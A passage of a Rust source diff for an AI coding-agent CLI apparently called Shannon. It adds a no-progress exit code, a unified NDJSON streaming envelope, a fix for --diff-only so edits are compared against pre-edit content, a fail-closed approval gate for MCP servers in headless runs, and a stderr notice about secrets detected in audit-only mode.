@@ -17,7 +17,7 @@ use shannon_core::{
     i18n,
     model_registry::resolve_model,
     provider_resolver::{resolve_model_ref, synthesize_default_profile},
-    query_engine::{QueryContext, QueryEngine, QueryEvent, QueryMetadata},
+    query_engine::{QueryContext, QueryEngine, QueryEvent, QueryMetadata, QueryOutcome},
     tools::ToolRegistry,
     unified_config::{ConfigBuilder, ShannonConfig},
 };
@@ -74,6 +74,13 @@ enum HeadlessExitCode {
     ContextOverflow = 5,
     /// 6 - a required permission was denied in non-interactive mode.
     PermissionDenied = 6,
+    /// 7 - the engine ended the query with NO usable progress (A1 bail-out
+    /// or the malformed-tool-call stop-loss). Deliberately distinct from the
+    /// other classes: 2 is TurnLimit, 3 Timeout, 4 RateLimited, 5
+    /// ContextOverflow, 6 PermissionDenied; run-batch scripts reserve 3 for
+    /// budget. A model-failure class must not collide with infra rc values
+    /// harnesses already branch on.
+    NoProgress = 7,
 }
 
 impl From<HeadlessExitCode> for i32 {
@@ -146,6 +153,22 @@ fn classify_headless_failure(error: &str) -> HeadlessExitCode {
     }
 }
 
+/// Map an engine-reported `QueryEvent::Completed` outcome onto the headless
+/// exit code. `None` keeps the Success default (the historical behavior for
+/// a plain completion). `NoProgress` — the engine ended the query without
+/// usable model output (A1 bail-out / malformed-call stop-loss) — must NOT
+/// exit 0: CI would book pure churn as a successful run with an empty patch
+/// (the accounting lie this follow-up fixes), so it maps to the fresh rc=7.
+/// `TurnBudgetExhausted` reuses the existing TurnLimit rc=2 semantics
+/// ("maximum turns reached before completion").
+fn completed_outcome_exit_code(outcome: QueryOutcome) -> Option<HeadlessExitCode> {
+    match outcome {
+        QueryOutcome::Completed => None,
+        QueryOutcome::NoProgress => Some(HeadlessExitCode::NoProgress),
+        QueryOutcome::TurnBudgetExhausted => Some(HeadlessExitCode::TurnLimit),
+    }
+}
+
 /// Parse the `SHANNON_RUN_RETRIES` run-level retry budget (A7).
 ///
 /// Default 2 when unset; unparseable or negative values fall back to the
@@ -215,6 +238,30 @@ fn is_infra_failure(
     exit_code.is_infra_class() && response_text.trim().is_empty() && tool_calls.is_empty()
 }
 
+/// review F32: file-mutating tools whose target path is captured on the
+/// request side so `--diff-only` can diff against true pre-execution content.
+const DIFF_TRACKED_TOOLS: &[&str] = &["Edit", "Write", "MultiEdit"];
+
+/// Extract the target path from a file-mutating tool request's input
+/// (`None` for every other tool).
+fn file_mutation_path(tool_name: &str, tool_input: &serde_json::Value) -> Option<String> {
+    if !DIFF_TRACKED_TOOLS.contains(&tool_name) {
+        return None;
+    }
+    tool_input
+        .get("file_path")
+        .or_else(|| tool_input.get("path"))
+        .and_then(|value| value.as_str())
+        .map(std::string::ToString::to_string)
+}
+
+/// Best-effort pre-execution read for the `--diff-only` old side. A missing
+/// file (a Write that creates it) reads as empty, matching the previous
+/// `unwrap_or_default` semantics.
+fn read_pre_edit_content(path: &str) -> String {
+    std::fs::read_to_string(path).unwrap_or_default()
+}
+
 /// Summary of a single tool call during headless execution.
 #[derive(Debug, Clone, serde::Serialize)]
 struct ToolCallSummary {
@@ -241,7 +288,11 @@ struct HeadlessOutput {
     total_tokens: u64,
     /// Wall-clock duration in milliseconds.
     duration_ms: u64,
-    /// Whether execution succeeded and why.
+    /// Exit code as an INTEGER 0-7 (review F35): the same canonical form the
+    /// json-stream `done` event documents and emits. 0 success, 1 error,
+    /// 2 max turns reached, 3 timeout, 4 rate limited, 5 context overflow,
+    /// 6 permission denied, 7 no progress.
+    #[serde(serialize_with = "serialize_headless_exit_code")]
     exit_code: HeadlessExitCode,
     /// A7: true when the run died on an infra class (timeout / rate limit /
     /// error) with an empty patch — no response text and no tool calls.
@@ -250,8 +301,31 @@ struct HeadlessOutput {
     infra_failure: bool,
 }
 
+/// review F35: serialize the exit code as its integer discriminant. The
+/// derive's `rename_all = "snake_case"` produced string variants
+/// (`"turn_limit"`) here while the json-stream `done` event (and the docs)
+/// promise integers 0-7 — one canonical form everywhere.
+fn serialize_headless_exit_code<S>(
+    code: &HeadlessExitCode,
+    serializer: S,
+) -> Result<S::Ok, S::Error>
+where
+    S: serde::Serializer,
+{
+    serializer.serialize_i32(i32::from(*code))
+}
+
 /// CI/CD event types for NDJSON streaming output.
 /// Each event is serialized as a single JSON object per line (newline-delimited).
+///
+/// F38 (review 2026-09-28): this is THE primary `--output-format json-stream`
+/// envelope. It absorbed the legacy [`OutputEvent`] vocabulary's one live
+/// event (`text_delta`) so a generic NDJSON consumer needs exactly one schema;
+/// the legacy vocabulary survives only behind `--emit-legacy-output-events`.
+/// Consumer map that decided this: `shannon-core/src/testing/eval_runner.rs`
+/// (frozen) builds the eval trajectory from `tool_call` lines and links
+/// sessions via `start.session_id`; `scripts/dogfood/runner.py` and the
+/// `scripts/eval/*` adapters read the same names — none reads `tool_use`.
 #[derive(Debug, Clone, serde::Serialize)]
 #[serde(tag = "type")]
 enum CiEvent {
@@ -264,6 +338,10 @@ enum CiEvent {
         /// persisted session file (needed for `--resume` checkpointing).
         session_id: String,
     },
+    /// Streamed assistant text fragment (absorbed from the legacy
+    /// OutputEvent envelope in F38 — the only legacy event with consumers).
+    #[serde(rename = "text_delta")]
+    TextDelta { content: String },
     /// Tool was invoked.
     #[serde(rename = "tool_call")]
     ToolCall {
@@ -655,9 +733,25 @@ struct Cli {
     // NOTE: `--allowed-tools` is defined above as `team_allowed_tools` (shared
     // by both --team-agent and --prompt headless modes).  Do not add a second
     // field with the same long option name — clap rejects duplicate longs.
-    /// Output format for headless mode (text or json).
+    /// Output format for headless mode (text, json, or json-stream).
+    ///
+    /// `json-stream` emits ONE NDJSON envelope (F38): start, text_delta,
+    /// tool_call, tool_result, progress, warning, error, and a single done
+    /// line {exit_code, turns_used, tokens_used, tokens_in, tokens_out,
+    /// infra_failure}. The pre-unification OutputEvent vocabulary
+    /// (tool_use / is_error / bare done) is available only via
+    /// `--emit-legacy-output-events`.
     #[arg(long = "output-format", default_value = "text")]
     output_format: OutputFormat,
+
+    /// DEPRECATED migration escape hatch (F38): emit the LEGACY json-stream
+    /// envelope (`text_delta`/`tool_use`/`tool_result{is_error}`/bare
+    /// `done{exit_code,infra_failure}`) INSTEAD of the unified envelope, so
+    /// consumers written against the pre-unification schema keep working
+    /// while they migrate. json-stream mode only; ignored by text/json.
+    /// Never combined with the unified envelope on the same stdout.
+    #[arg(long = "emit-legacy-output-events", hide = true)]
+    emit_legacy_output_events: bool,
 
     /// Maximum turns in headless mode before exiting with code 2. When
     /// unset, headless runs default to 100 turns (interactive sessions use
@@ -691,6 +785,17 @@ struct Cli {
     /// Overridden by `[notifications] enabled = true|false` in `.shannon.toml`.
     #[arg(long)]
     notify: bool,
+
+    /// Pre-approve an MCP server by name for this non-interactive run.
+    /// Repeatable. Headless paths (`--prompt`, positional prompt, `--pipe`,
+    /// `query`, `--team-agent`) REFUSE to spawn project-configured MCP servers
+    /// (repo `.mcp.json` / `.claude/settings.json` / `.shannon/mcp_servers.json`)
+    /// unless the server is approved in the user store
+    /// (`~/.shannon/mcp_approvals.json`), listed here, or the escape hatch
+    /// `SHANNON_MCP_AUTO_APPROVE=1` restores the legacy auto-connect behavior.
+    /// Example: shannon -p "run checks" --mcp-approve playwright
+    #[arg(long = "mcp-approve", value_name = "NAME")]
+    mcp_approve: Vec<String>,
 
     /// Print the effective layered configuration with per-entry provenance
     /// (§4.10 W3-2) as JSON and exit.
@@ -820,8 +925,11 @@ enum Commands {
         verbose: bool,
     },
 
-    /// Manage Shannon configuration
+    /// Manage Shannon configuration (no arg: list; `<key>`: get;
+    /// `<key>=<value>`: set — engine-readable keys are mirrored into
+    /// ~/.shannon/config.toml, secrets are refused)
     Config {
+        /// `key` to get, or `key=value` to set
         #[arg(short, long)]
         setting: Option<String>,
     },
@@ -1539,6 +1647,98 @@ fn headless_resume_data(
     }
 }
 
+/// review F5: decide whether a project-configured MCP server may be spawned
+/// in a headless/non-interactive path.
+///
+/// There is no interactive user to answer an approval prompt, so the gate
+/// FAILS CLOSED: the server is skipped with a warning unless
+/// - `SHANNON_MCP_AUTO_APPROVE=1` (documented escape hatch restoring the
+///   pre-gate auto-connect behavior),
+/// - the server name is listed in `--mcp-approve <NAME>`, or
+/// - the exact server identity (name + command/URL + args fingerprint) is
+///   approved in the USER-domain approval store (review F6).
+fn headless_mcp_server_allowed(
+    server_name: &str,
+    command: Option<&str>,
+    args: &[String],
+    url: Option<&str>,
+    cli_approved: &[String],
+) -> bool {
+    if matches!(
+        std::env::var("SHANNON_MCP_AUTO_APPROVE").as_deref(),
+        Ok("1")
+    ) {
+        return true;
+    }
+    if cli_approved.iter().any(|name| name == server_name) {
+        return true;
+    }
+    let mut mgr = shannon_core::McpApprovalManager::with_defaults();
+    if let Err(e) = mgr.load_user_domain() {
+        tracing::debug!("headless MCP gate: could not load approval state: {e}");
+    }
+    headless_mcp_allowed_in_manager(&mgr, server_name, command, args, url)
+}
+
+/// Identity-aware check against an already-loaded approval manager
+/// (split from [`headless_mcp_server_allowed`] so the binding logic is
+/// unit-testable without touching the user's approval store).
+fn headless_mcp_allowed_in_manager(
+    mgr: &shannon_core::McpApprovalManager,
+    server_name: &str,
+    command: Option<&str>,
+    args: &[String],
+    url: Option<&str>,
+) -> bool {
+    let fingerprint = match (command, url) {
+        (Some(cmd), _) => Some(shannon_core::mcp_server_approval::mcp_server_fingerprint(
+            server_name,
+            cmd,
+            args,
+        )),
+        (None, Some(url)) => Some(shannon_core::mcp_server_approval::mcp_server_fingerprint(
+            server_name,
+            url,
+            &[],
+        )),
+        (None, None) => None,
+    };
+    mgr.is_identity_approved(server_name, fingerprint.as_deref())
+}
+
+/// Warn (stderr + tracing) that a headless run skipped an unapproved MCP
+/// server instead of spawning it.
+fn warn_headless_mcp_skipped(server_name: &str) {
+    let msg = format!(
+        "MCP server '{server_name}' is not approved; skipping (pass --mcp-approve {server_name}, \
+         approve it in ~/.shannon/mcp_approvals.json, or set SHANNON_MCP_AUTO_APPROVE=1)"
+    );
+    tracing::warn!("{msg}");
+    eprintln!("  Warning: {msg}");
+}
+
+/// The one-line T5 redaction opt-in notice. Split from the printer so the
+/// wording is unit-testable without arming the process-global one-shot
+/// latch in `shannon_core::secret_guard`.
+fn redaction_suggestion_notice() -> &'static str {
+    "Notice: potential secrets were detected in outbound LLM requests while secret-guard \
+     is in audit-only mode (values were forwarded to the provider and written to the \
+     session log). Enable redaction with [secret_guard] mode = \"redact\" in .shannon.toml \
+     (or ~/.shannon/config.toml), or SHANNON_SECRET_GUARD=redact"
+}
+
+/// T5 leftover: after a headless run completes, surface the one-shot
+/// redaction opt-in suggestion on STDERR. Never stdout — stdout is the
+/// machine contract (NDJSON / JSON / plain text) in every non-interactive
+/// mode. [`shannon_core::secret_guard::take_redaction_suggestion`] fires at
+/// most once per process and already emits a `tracing::warn!`; this adds
+/// the human-visible stderr line.
+fn print_redaction_suggestion_notice() {
+    if shannon_core::secret_guard::take_redaction_suggestion() {
+        eprintln!("{}", redaction_suggestion_notice());
+    }
+}
+
 /// Run a non-interactive query, outputting results to stdout.
 /// `stream` controls whether text is streamed character-by-character.
 /// `config` holds explicit CLI configuration.
@@ -1555,10 +1755,11 @@ fn run_noninteractive_query(
     goal: Option<String>,
     attachments: Vec<shannon_engine::api::ContentBlock>,
     permission_mode: Option<&str>,
+    mcp_approve: &[String],
 ) -> Result<()> {
     let rt = tokio::runtime::Runtime::new()?;
 
-    rt.block_on(async {
+    let query_result: Result<()> = rt.block_on(async {
         // Build tool registry with all standard tools (sandboxed to project dir)
         let (project_dir, providers) =
             shannon_remote::assembly::assemble_for_headless()
@@ -1587,6 +1788,18 @@ fn run_noninteractive_query(
             if mcp_count > 0 {
                 eprintln!("Discovered {mcp_count} MCP server(s)");
                 for config in mcp_registry.enabled_servers() {
+                    // review F5: no interactive user in headless mode — fail
+                    // closed unless the server is explicitly approved.
+                    if !headless_mcp_server_allowed(
+                        &config.name,
+                        config.command.as_deref(),
+                        &config.args,
+                        config.url.as_deref(),
+                        mcp_approve,
+                    ) {
+                        warn_headless_mcp_skipped(&config.name);
+                        continue;
+                    }
                     let command = match &config.command {
                         Some(cmd) => cmd.clone(),
                         None => {
@@ -1907,7 +2120,15 @@ fn run_noninteractive_query(
         }
 
         Ok(())
-    })
+    });
+    query_result?;
+
+    // T5 leftover: one-shot stderr notice when the secret guard saw
+    // audit-only findings this run. STDERR only — stdout here is plain text
+    // that scripts and wrappers capture.
+    print_redaction_suggestion_notice();
+
+    Ok(())
 }
 
 /// Emit an NDJSON event to stdout (newline-delimited JSON).
@@ -1921,7 +2142,11 @@ fn emit_ci_event(event: &CiEvent) {
     }
 }
 
-/// NDJSON event type for structured streaming output.
+/// LEGACY NDJSON event type (F38) — emitted ONLY under
+/// `--emit-legacy-output-events`, for external consumers that coded against
+/// the pre-unification OutputEvent schema (`tool_use` / `is_error` / bare
+/// `done`). Default json-stream mode emits the unified [`CiEvent`] envelope
+/// instead; the two vocabularies never share a stdout anymore.
 /// Mirrors the type defined in `shannon_core::output_format` but kept local
 /// to avoid a dependency that some build environments strip during linting.
 #[derive(Debug, Clone, serde::Serialize)]
@@ -1976,6 +2201,120 @@ fn emit_output_event(event: &OutputEvent) {
     }
 }
 
+// ── F38: json-stream envelope dispatch ─────────────────────────────────
+//
+// json-stream mode previously wrote BOTH vocabularies to the same stdout:
+// every tool call produced a `CiEvent::ToolCall` ("tool_call") AND an
+// `OutputEvent::ToolUse` ("tool_use") line, and the run ended with two
+// differently-shaped `done` lines. Each helper below routes ONE logical
+// event onto the ACTIVE envelope: the unified [`CiEvent`] vocabulary by
+// default, the legacy [`OutputEvent`] vocabulary when
+// `--emit-legacy-output-events` is passed (migration escape hatch). They
+// are only called from `OutputFormat::JsonStream` branches.
+
+/// Streamed text fragment on the active envelope.
+fn emit_stream_text_delta(legacy_output_events: bool, content: &str) {
+    if legacy_output_events {
+        emit_output_event(&OutputEvent::TextDelta {
+            content: content.to_string(),
+        });
+    } else {
+        emit_ci_event(&CiEvent::TextDelta {
+            content: content.to_string(),
+        });
+    }
+}
+
+/// Tool invocation on the active envelope (`tool_call` unified,
+/// `tool_use` legacy). The full parsed input travels on both — see review F31.
+fn emit_stream_tool_call(legacy_output_events: bool, name: &str, input: &serde_json::Value) {
+    if legacy_output_events {
+        emit_output_event(&OutputEvent::ToolUse {
+            name: name.to_string(),
+            input: input.clone(),
+        });
+    } else {
+        emit_ci_event(&CiEvent::ToolCall {
+            name: name.to_string(),
+            input: input.clone(),
+        });
+    }
+}
+
+/// Tool completion on the active envelope. Unified carries `success`,
+/// legacy carries `is_error` (the two are complements).
+fn emit_stream_tool_result(legacy_output_events: bool, name: &str, output: &str, is_error: bool) {
+    if legacy_output_events {
+        emit_output_event(&OutputEvent::ToolResult {
+            name: name.to_string(),
+            output: output.to_string(),
+            is_error,
+        });
+    } else {
+        emit_ci_event(&CiEvent::ToolResult {
+            name: name.to_string(),
+            output: output.to_string(),
+            success: !is_error,
+        });
+    }
+}
+
+/// Non-fatal warning on the active envelope.
+fn emit_stream_warning(legacy_output_events: bool, message: &str) {
+    if legacy_output_events {
+        emit_output_event(&OutputEvent::Warning {
+            message: message.to_string(),
+        });
+    } else {
+        emit_ci_event(&CiEvent::Warning {
+            message: message.to_string(),
+        });
+    }
+}
+
+/// Terminal/failure notice on the active envelope.
+fn emit_stream_error(legacy_output_events: bool, message: &str) {
+    if legacy_output_events {
+        emit_output_event(&OutputEvent::Error {
+            message: message.to_string(),
+        });
+    } else {
+        emit_ci_event(&CiEvent::Error {
+            message: message.to_string(),
+        });
+    }
+}
+
+/// THE single terminal `done` line (F38). Unified carries the full union —
+/// integer `exit_code` (review F35), `turns_used`, `tokens_used`,
+/// `tokens_in`, `tokens_out`, `infra_failure`; legacy keeps its bare
+/// `{exit_code, infra_failure}` shape so old parsers stay byte-compatible.
+fn emit_stream_done(
+    legacy_output_events: bool,
+    exit_code: i32,
+    turns_used: u32,
+    tokens_used: u64,
+    tokens_in: u64,
+    tokens_out: u64,
+    infra_failure: bool,
+) {
+    if legacy_output_events {
+        emit_output_event(&OutputEvent::Done {
+            exit_code,
+            infra_failure,
+        });
+    } else {
+        emit_ci_event(&CiEvent::Done {
+            exit_code,
+            turns_used,
+            tokens_used,
+            tokens_in,
+            tokens_out,
+            infra_failure,
+        });
+    }
+}
+
 /// Load a JSON Schema from a file path or inline JSON string.
 ///
 /// If the input starts with `{` or `[`, it's parsed as inline JSON.
@@ -2005,10 +2344,19 @@ fn load_schema(input: &str) -> Result<shannon_core::StructuredOutputConfig> {
 ///   abort the run)
 /// - Limits turns via `--max-turns` (exit code 2 when exceeded)
 /// - Outputs structured JSON with `--output-format json`
+/// - `--output-format json-stream` emits ONE unified NDJSON envelope
+///   (review F38): start / text_delta / tool_call / tool_result / progress /
+///   warning / error, ended by a single `done` line. The legacy
+///   OutputEvent vocabulary is available only via the
+///   `--emit-legacy-output-events` escape hatch, which replaces (never
+///   duplicates) the unified stream.
 ///
-/// Exit codes (`HeadlessExitCode`): 0 success, 1 error, 2 max turns
-/// reached, 3 timeout (retries exhausted after read/timeouts), 4 rate
-/// limited (retries exhausted), 5 context overflow, 6 permission denied.
+/// Exit codes are integers 0-7 everywhere (review F35 — the single canonical
+/// form, identical in `--output-format json`'s `exit_code` field and the
+/// json-stream `done` event): 0 success, 1 error, 2 max turns reached,
+/// 3 timeout (retries exhausted after read/timeouts), 4 rate limited
+/// (retries exhausted), 5 context overflow, 6 permission denied,
+/// 7 no usable progress.
 #[allow(clippy::too_many_arguments)]
 #[allow(clippy::too_many_arguments)]
 fn run_headless_query(
@@ -2017,6 +2365,7 @@ fn run_headless_query(
     allowed_tools: Option<&[String]>,
     disallowed_tools: &[String],
     output_format: OutputFormat,
+    emit_legacy_output_events: bool,
     max_turns: Option<u32>,
     exit_on_error: bool,
     quiet: bool,
@@ -2025,6 +2374,7 @@ fn run_headless_query(
     schema_config: Option<&shannon_core::StructuredOutputConfig>,
     notify: bool,
     goal: Option<String>,
+    mcp_approve: &[String],
 ) -> Result<()> {
     // Arm structured crash capture when the dogfood loop (or any CI harness)
     // points SHANNON_CRASH_DIR at a scratch directory; no-op otherwise.
@@ -2072,6 +2422,18 @@ fn run_headless_query(
             if mcp_count > 0 {
                 eprintln!("Discovered {mcp_count} MCP server(s)");
                 for mcp_config in mcp_registry.enabled_servers() {
+                    // review F5: no interactive user in headless mode — fail
+                    // closed unless the server is explicitly approved.
+                    if !headless_mcp_server_allowed(
+                        &mcp_config.name,
+                        mcp_config.command.as_deref(),
+                        &mcp_config.args,
+                        mcp_config.url.as_deref(),
+                        mcp_approve,
+                    ) {
+                        warn_headless_mcp_skipped(&mcp_config.name);
+                        continue;
+                    }
                     let command = match &mcp_config.command {
                         Some(cmd) => cmd.clone(),
                         None => continue,
@@ -2262,6 +2624,9 @@ fn run_headless_query(
         let mut turn_budget_warning_80_fired = false;
         let mut turn_budget_warning_95_fired = false;
         let mut changed_files: Vec<(String, String, String)> = Vec::new(); // (path, old, new)
+        // review F32: pre-execution file snapshots for --diff-only, keyed by
+        // tool_use_id: (tool_use_id, path, old content).
+        let mut pending_file_contents: Vec<(String, String, String)> = Vec::new();
         let allowed_set: Option<std::collections::HashSet<String>> =
             allowed_tools.map(|v| v.iter().cloned().collect());
 
@@ -2273,8 +2638,9 @@ fn run_headless_query(
         let run_retries = run_retry_limit();
         let mut run_attempt: u32 = 0;
 
-        // Emit start event for JsonStream format
-        if output_format == OutputFormat::JsonStream {
+        // Emit start event for JsonStream format (unified envelope only —
+        // the legacy OutputEvent vocabulary has no start event).
+        if output_format == OutputFormat::JsonStream && !emit_legacy_output_events {
             let model_name = config.model().unwrap_or_else(|| "default".to_string());
             emit_ci_event(&CiEvent::Start {
                 prompt: prompt.to_string(),
@@ -2291,11 +2657,11 @@ fn run_headless_query(
                             print!("{content}");
                             std::io::stdout().flush().ok();
                         } else if output_format == OutputFormat::JsonStream {
-                            emit_output_event(&OutputEvent::TextDelta { content: content.clone() });
+                            emit_stream_text_delta(emit_legacy_output_events, &content);
                         }
                         response_text.push_str(&content);
                     }
-                    Ok(QueryEvent::ToolUseRequest { tool_name, tool_input, .. }) => {
+                    Ok(QueryEvent::ToolUseRequest { tool_name, tool_input, tool_use_id, .. }) => {
                         // A tool call supersedes the preceding text as this turn's
                         // contribution: keep only the text of the FINAL answer
                         // turn in `response_text`. Schema validation and the
@@ -2334,22 +2700,32 @@ fn run_headless_query(
                             Ok(s) => s,
                             Err(_) => "(invalid json)".to_string(),
                         };
+                        // review F32: capture PRE-execution content for
+                        // --diff-only. Reading the file after the tool ran
+                        // (the old behavior) recorded the post-edit state as
+                        // "old", so a single edit diffed against itself (empty
+                        // diff) and two edits showed only the second delta.
+                        // Keyed by tool_use_id so parallel calls pair exactly.
+                        if let Some(path) = file_mutation_path(&tool_name, &tool_input) {
+                            let old = read_pre_edit_content(&path);
+                            pending_file_contents
+                                .push((tool_use_id.clone(), path, old));
+                        }
                         _pending_tool_name = Some(tool_name.clone());
                         if !quiet {
                             eprintln!("[headless: invoking {tool_name}]");
                         }
-                        // Emit NDJSON event
+                        // review F31: emit the ORIGINAL parsed tool_input. The
+                        // 500-byte `input_summary` is not valid JSON for large
+                        // calls, so gating emission on it silently dropped the
+                        // ToolCall/ToolUse events for exactly the most
+                        // interesting invocations. Truncation now applies only
+                        // to the final HeadlessOutput summaries.
                         if output_format == OutputFormat::JsonStream {
-                            if let Ok(input_value) = serde_json::from_str::<serde_json::Value>(&input_summary) {
-                                emit_ci_event(&CiEvent::ToolCall {
-                                    name: tool_name.clone(),
-                                    input: input_value.clone(),
-                                });
-                                emit_output_event(&OutputEvent::ToolUse {
-                                    name: tool_name.clone(),
-                                    input: input_value,
-                                });
-                            }
+                            // F38: ONE tool event on the active envelope —
+                            // `tool_call` (unified) or `tool_use` (legacy),
+                            // never both.
+                            emit_stream_tool_call(emit_legacy_output_events, &tool_name, &tool_input);
                         }
                         // Store a placeholder; will be updated on ToolUseResult
                         tool_calls.push(ToolCallSummary {
@@ -2359,7 +2735,7 @@ fn run_headless_query(
                             success: false,
                         });
                     }
-                    Ok(QueryEvent::ToolUseResult { tool_name, result, is_error, .. }) => {
+                    Ok(QueryEvent::ToolUseResult { tool_name, tool_use_id, result, is_error, .. }) => {
                         let output_summary = if result.len() > 500 {
                             let mut end = 500;
                             while !result.is_char_boundary(end) { end -= 1; }
@@ -2374,29 +2750,29 @@ fn run_headless_query(
                         }
                         _pending_tool_name = None;
 
-                        // Track file changes for diff-only mode
-                        if tool_name == "Edit" || tool_name == "Write" {
-                            if let Ok(tool_result) = serde_json::from_str::<serde_json::Value>(&result) {
-                                if let Some(path) = tool_result.get("path").and_then(|p| p.as_str()) {
-                                    // Read current file content for diff
-                                    let old_content = std::fs::read_to_string(path).unwrap_or_default();
-                                    changed_files.push((path.to_string(), old_content, String::new()));
-                                }
-                            }
+                        // Track file changes for diff-only mode. review F32:
+                        // pair the result with the pre-execution snapshot
+                        // captured on the request side (keyed by tool_use_id);
+                        // the post-execution content is read at diff time.
+                        // The old approach parsed the tool's prose content as
+                        // JSON and looked for a "path" key — it never matched,
+                        // so --diff-only recorded nothing for Edit/Write.
+                        if let Some(pos) = pending_file_contents
+                            .iter()
+                            .position(|(id, _, _)| *id == tool_use_id)
+                        {
+                            let (_, path, old) = pending_file_contents.remove(pos);
+                            changed_files.push((path, old, String::new()));
                         }
 
-                        // Emit NDJSON event
+                        // Emit NDJSON event (F38: single envelope)
                         if output_format == OutputFormat::JsonStream {
-                            emit_ci_event(&CiEvent::ToolResult {
-                                name: tool_name.clone(),
-                                output: output_summary.clone(),
-                                success: !is_error,
-                            });
-                            emit_output_event(&OutputEvent::ToolResult {
-                                name: tool_name.clone(),
-                                output: output_summary.clone(),
+                            emit_stream_tool_result(
+                                emit_legacy_output_events,
+                                &tool_name,
+                                &output_summary,
                                 is_error,
-                            });
+                            );
                         }
 
                         // Handle exit-on-error
@@ -2406,12 +2782,10 @@ fn run_headless_query(
                             }
                             exit_code = HeadlessExitCode::Error;
                             if output_format == OutputFormat::JsonStream {
-                                emit_ci_event(&CiEvent::Error {
-                                    message: format!("Tool {tool_name} failed: {output_summary}"),
-                                });
-                                emit_output_event(&OutputEvent::Error {
-                                    message: format!("Tool {tool_name} failed: {output_summary}"),
-                                });
+                                emit_stream_error(
+                                    emit_legacy_output_events,
+                                    &format!("Tool {tool_name} failed: {output_summary}"),
+                                );
                             }
                             break;
                         }
@@ -2460,10 +2834,7 @@ fn run_headless_query(
                                     eprintln!("[headless: {message}]");
                                 }
                                 if output_format == OutputFormat::JsonStream {
-                                    emit_ci_event(&CiEvent::Warning {
-                                        message: message.clone(),
-                                    });
-                                    emit_output_event(&OutputEvent::Warning { message });
+                                    emit_stream_warning(emit_legacy_output_events, &message);
                                 }
                             }
                         }
@@ -2499,7 +2870,13 @@ fn run_headless_query(
                         // case a provider emits more than one.
                         engine_usage = Some((input_tokens, output_tokens));
                     }
-                    Ok(QueryEvent::Completed { .. }) => {
+                    Ok(QueryEvent::Completed { outcome, .. }) => {
+                        // Honest accounting: an engine-reported no-progress or
+                        // budget-exhausted outcome downgrades the exit code so
+                        // CI stops treating churn as success (rc=7 / rc=2).
+                        if let Some(code) = completed_outcome_exit_code(outcome) {
+                            exit_code = code;
+                        }
                         if output_format == OutputFormat::Text && !response_text.is_empty() {
                             // Text was already streamed; just ensure newline
                             println!();
@@ -2539,13 +2916,15 @@ fn run_headless_query(
                             if output_format == OutputFormat::JsonStream {
                                 // Synthetic stream event so harnesses see the
                                 // restart between the failure and attempt 2.
-                                emit_output_event(&OutputEvent::Error {
-                                    message: format!("[run-retry] attempt {run_attempt} after {kind}: {error}"),
-                                });
+                                emit_stream_error(
+                                    emit_legacy_output_events,
+                                    &format!("[run-retry] attempt {run_attempt} after {kind}: {error}"),
+                                );
                             }
                             response_text.clear();
                             tool_calls.clear();
                             changed_files.clear();
+                            pending_file_contents.clear();
                             total_tokens = 0;
                             total_input_tokens = 0;
                             total_output_tokens = 0;
@@ -2558,9 +2937,7 @@ fn run_headless_query(
                         eprintln!("Error: {error}");
                         exit_code = class;
                         if output_format == OutputFormat::JsonStream {
-                            emit_output_event(&OutputEvent::Error {
-                                message: error.clone(),
-                            });
+                            emit_stream_error(emit_legacy_output_events, &error);
                         }
                     }
                     Ok(QueryEvent::Progress { message, .. }) => {
@@ -2571,7 +2948,9 @@ fn run_headless_query(
                         if !quiet {
                             eprintln!("[headless: {message}]");
                         }
-                        if output_format == OutputFormat::JsonStream {
+                        if output_format == OutputFormat::JsonStream && !emit_legacy_output_events {
+                            // `progress` exists only in the unified envelope;
+                            // strict legacy mode never carried it.
                             emit_ci_event(&CiEvent::Progress { message });
                         }
                     }
@@ -2580,10 +2959,7 @@ fn run_headless_query(
                             eprintln!("[headless: warning: {message}]");
                         }
                         if output_format == OutputFormat::JsonStream {
-                            emit_ci_event(&CiEvent::Warning {
-                                message: message.clone(),
-                            });
-                            emit_output_event(&OutputEvent::Warning { message });
+                            emit_stream_warning(emit_legacy_output_events, &message);
                         }
                     }
                     Ok(QueryEvent::RateLimit {
@@ -2652,9 +3028,10 @@ fn run_headless_query(
                     eprintln!("Schema validation failed: {e}");
                     exit_code = HeadlessExitCode::Error;
                     if output_format == OutputFormat::JsonStream {
-                        emit_output_event(&OutputEvent::Error {
-                            message: format!("Schema validation failed: {e}"),
-                        });
+                        emit_stream_error(
+                            emit_legacy_output_events,
+                            &format!("Schema validation failed: {e}"),
+                        );
                     }
                 }
             }
@@ -2684,19 +3061,20 @@ fn run_headless_query(
                 }));
             }
             OutputFormat::JsonStream => {
-                // Emit final done event
-                emit_ci_event(&CiEvent::Done {
-                    exit_code: i32::from(exit_code),
-                    turns_used: _turn_count as u32,
-                    tokens_used: total_tokens,
+                // F38: exactly ONE terminal `done` line, on the active
+                // envelope. The unified shape carries the full field union
+                // consumers need: integer `exit_code` (review F35),
+                // `infra_failure` (A7), `turns_used`, `tokens_used`, and the
+                // split `tokens_in`/`tokens_out` ledger fields.
+                emit_stream_done(
+                    emit_legacy_output_events,
+                    i32::from(exit_code),
+                    _turn_count as u32,
+                    total_tokens,
                     tokens_in,
                     tokens_out,
                     infra_failure,
-                });
-                emit_output_event(&OutputEvent::Done {
-                    exit_code: i32::from(exit_code),
-                    infra_failure,
-                });
+                );
             }
         }
 
@@ -2728,6 +3106,10 @@ fn run_headless_query(
     if notify {
         fire_headless_completion_notification(exit_code, prompt);
     }
+
+    // T5 leftover: one-shot stderr notice when the secret guard saw audit-only
+    // findings this run. STDERR only — stdout is the NDJSON contract above.
+    print_redaction_suggestion_notice();
 
     // Exit with the appropriate code
     std::process::exit(i32::from(exit_code));
@@ -2775,6 +3157,11 @@ fn fire_headless_completion_notification(exit_code: HeadlessExitCode, prompt: &s
             "Shannon — rate limited",
             "API provider returned 429; retry later.".to_string(),
             NotificationLevel::Error,
+        ),
+        HeadlessExitCode::NoProgress => (
+            "Shannon — no progress",
+            "The engine ended the query without usable model output.".to_string(),
+            NotificationLevel::Warning,
         ),
         HeadlessExitCode::ContextOverflow => (
             "Shannon — context overflow",
@@ -3067,6 +3454,7 @@ fn run_team_agent_mode(
     permission_mode: Option<&str>,
     allowed_tools: Option<&str>,
     disallowed_tools: &[String],
+    mcp_approve: &[String],
 ) -> Result<()> {
     // Change working directory if specified
     if let Some(dir) = workdir {
@@ -3102,6 +3490,18 @@ fn run_team_agent_mode(
             if mcp_count > 0 {
                 tracing::info!("Discovered {mcp_count} MCP server(s)");
                 for mcp_config in mcp_registry.enabled_servers() {
+                    // review F5: team agents run headless — fail closed unless
+                    // the server is explicitly approved.
+                    if !headless_mcp_server_allowed(
